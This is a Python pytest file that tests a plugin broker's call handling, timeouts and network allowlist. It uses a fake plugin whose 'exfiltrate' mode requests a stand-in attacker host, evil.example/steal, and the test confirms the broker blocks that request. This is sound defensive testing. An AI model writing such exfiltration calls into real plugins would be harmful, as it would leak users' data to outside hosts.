import textwrap
import time
from pathlib import Path

import pytest

from romm_hub.broker.host import PluginCallError, PluginProcess
from romm_hub.manifest import parse_manifest

MANIFEST = """
[plugin]
slug = "fake"
name = "Fake"
version = "0.1.0"
rpp_version = "1"

[capabilities]
search = "fake_plugin:Search"

[permissions]
network = ["allowed.example"]
romm_api = []
"""

PLUGIN_SRC = textwrap.dedent(
    '''
    import time

    from romm_hub_sdk import SearchProvider, SearchResult


    class Search(SearchProvider):
        def search(self, query, platform, limit):
            mode = self.ctx.config.get("mode", "static")
            if mode == "boom":
                raise ValueError("plugin exploded")
            if mode == "hang":
                time.sleep(600)
            if mode == "fetch":
                resp = self.ctx.http.get("https://allowed.example/data")
                return [SearchResult(source_id="fetched", title=resp.text)]
            if mode == "exfiltrate":
                resp = self.ctx.http.get("https://evil.example/steal")
                return [SearchResult(source_id="leaked", title=resp.text)]
            return [SearchResult(source_id="a", title=f"result for {query}")]
    '''
)


class RecordingFetcher:
    def __init__(self):
        self.calls: list[str] = []

    def get(self, url: str, params: dict) -> tuple[int, str]:
        self.calls.append(url)
        return 200, "payload"


@pytest.fixture
def plugin_dir(tmp_path: Path) -> Path:
    (tmp_path / "fake_plugin.py").write_text(PLUGIN_SRC, encoding="utf-8")
    return tmp_path


def _proc(plugin_dir, fetcher, config=None, timeout=30.0):
    return PluginProcess(
        plugin_dir=plugin_dir,
        manifest=parse_manifest(MANIFEST),
        config=config or {},
        fetcher=fetcher,
        timeout=timeout,
        # These tests exercise broker mechanics (call/response, timeouts,
        # URL-allowlist enforcement), not sandbox policy, so opt out of the
        # fail-closed default rather than requiring a real sandbox here.
        allow_unsandboxed=True,
    )


def test_search_returns_validated_results(plugin_dir):
    with _proc(plugin_dir, RecordingFetcher()) as proc:
        results = proc.search("oregon", None, 10)
    assert len(results) == 1
    assert results[0].title == "result for oregon"
    assert results[0].plugin == "fake"


def test_allowed_fetch_reaches_the_fetcher(plugin_dir):
    fetcher = RecordingFetcher()
    with _proc(plugin_dir, fetcher, {"mode": "fetch"}) as proc:
        results = proc.search("q", None, 10)
    assert fetcher.calls == ["https://allowed.example/data"]
    assert results[0].title == "payload"


def test_disallowed_fetch_never_reaches_the_fetcher(plugin_dir):
    fetcher = RecordingFetcher()
    with _proc(plugin_dir, fetcher, {"mode": "exfiltrate"}) as proc:
        with pytest.raises(PluginCallError, match="evil.example"):
            proc.search("q", None, 10)
    assert fetcher.calls == []


def test_plugin_exception_becomes_plugin_call_error(plugin_dir):
    with _proc(plugin_dir, RecordingFetcher(), {"mode": "boom"}) as proc:
        with pytest.raises(PluginCallError, match="plugin exploded"):
            proc.search("q", None, 10)


def test_hung_plugin_times_out_and_is_killed(plugin_dir):
    started = time.monotonic()
    with _proc(plugin_dir, RecordingFetcher(), {"mode": "hang"}, timeout=2.0) as proc:
        with pytest.raises(PluginCallError, match="timed out"):
            proc.search("q", None, 10)
    # The watchdog must actually fire, not wait out the plugin's 600s sleep.
    assert time.monotonic() - started < 30
